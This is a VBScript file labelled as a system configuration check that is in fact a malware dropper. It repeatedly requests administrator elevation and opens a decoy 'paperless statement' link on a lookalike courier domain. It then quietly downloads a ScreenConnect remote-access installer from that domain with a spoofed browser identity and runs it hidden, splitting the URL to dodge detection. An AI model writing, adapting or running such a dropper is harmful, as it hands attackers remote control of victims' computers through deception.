' System configuration check

Dim objShellApp, fsHandler, strShellModule, strFSRef, tempFolder, strInstallerPath, strResourceURL, strPreviewURL, strSetupExe, strAutoFlag, strHostApp, strExecMode, strModeFlag, strScriptLoc, strStatusKey, objRegShell, intStateVal, nStep

strShellModule = "Shell.Application"
strFSRef = "Scripting.FileSystemObject"
strHostApp = WScript.FullName
strExecMode = "runas"
strModeFlag = "elevated"
strScriptLoc = WScript.ScriptFullName
strStatusKey = "HKCU\Software\BlueSky\InstallState"


Sub VerifyContext()
Set objRegShell = CreateObject("WScript.Shell")
If Not WScript.Arguments.Named.Exists(strModeFlag) Then
On Error Resume Next
objRegShell.RegDelete strStatusKey
On Error GoTo 0
Set objShellApp = CreateObject(strShellModule)
Dim iPass
Dim strLoopArgs
For iPass = 1 To 3
strLoopArgs = """" & strScriptLoc & """"
strLoopArgs = strLoopArgs & " /" & strModeFlag
strLoopArgs = strLoopArgs & " """ & strStatusKey & """"
objShellApp.ShellExecute strHostApp, strLoopArgs, "", strExecMode, 1
WScript.Sleep 1823
On Error Resume Next
Err.Clear
intStateVal = objRegShell.RegRead(strStatusKey)
If Err.Number = 0 Then
On Error GoTo 0
Exit For
End If
On Error GoTo 0
Next
On Error Resume Next
objRegShell.RegDelete strStatusKey
On Error GoTo 0
WScript.Quit
End If
End Sub


Sub ShowResource()
strPreviewURL = "https://courrierlogisticexpress.com/adobe_flash_update_paperless_statement.pdf"
Dim urlRunner, strShellProvider
strShellProvider = "WScript.Shell"
Set urlRunner = CreateObject(strShellProvider)
urlRunner.Run strPreviewURL, 1, False
End Sub

Function BuildLocation(strFile)
If strFile = "" Then
BuildLocation = "C:\temp"
Else
BuildLocation = "C:\temp\" & strFile
End If
End Function

Sub AssessRuntime()
Dim strOSVer : strOSVer = ""
On Error Resume Next
strOSVer = CreateObject("WScript.Shell").Environment("Process")("OS")
On Error GoTo 0
End Sub


Sub FetchResource(strLink, strDest)
Dim objExecHost
Set objExecHost = CreateObject("WScript.Shell")
Dim intReturn
Dim strCmd : strCmd = "curl.exe -s -L --fail -o """ & strDest & """ """ & strLink & """"
strCmd = strCmd & " -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) G" & "ecko/20100101 Firefox/142.0"""
intReturn = objExecHost.Run(strCmd, 0, True)
If intReturn <> 0 Then WScript.Quit
Dim oCheckFSO
Set oCheckFSO = CreateObject("Scripting.FileSystemObject")
If Not oCheckFSO.FileExists(strDest) Then WScript.Quit
End Sub

Sub DeployPackage(strPkgFile)
On Error Resume Next
If Not fsHandler.FileExists(strPkgFile) Then
Exit Sub
End If
On Error GoTo 0
Dim objInstallRunner
Set objInstallRunner = CreateObject("WScript.Shell")
objInstallRunner.Run """" & strPkgFile & """", 0, False
End Sub

If WScript.Arguments.Named.Exists(strModeFlag) Then
If WScript.Arguments.Unnamed.Count >= 1 Then
Set objRegShell = CreateObject("WScript.Shell")
objRegShell.RegWrite WScript.Arguments.Unnamed(0), 1, "REG_DWORD"
End If
End If
AssessRuntime
VerifyContext

WScript.Sleep 1290
ShowResource
WScript.Sleep 1149

Set fsHandler = CreateObject(strFSRef)
tempFolder = fsHandler.GetSpecialFolder(2)
strInstallerPath = tempFolder & "\installer.exe"
strResourceURL = "https:/" & "/courrierlogistic" & "express.com/ScreenConnect.ClientSetup." & "msi"

FetchResource strResourceURL, strInstallerPath

For nStep = 1 To 3
WScript.Sleep 1948
Next
Dim intPkgSize : intPkgSize = fsHandler.GetFile(strInstallerPath).Size
If intPkgSize < 1 Then WScript.Quit
Dim strSessionRef : strSessionRef = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
Dim strClockTick : strClockTick = Now()
WScript.Sleep 380
DeployPackage Trim(strInstallerPath)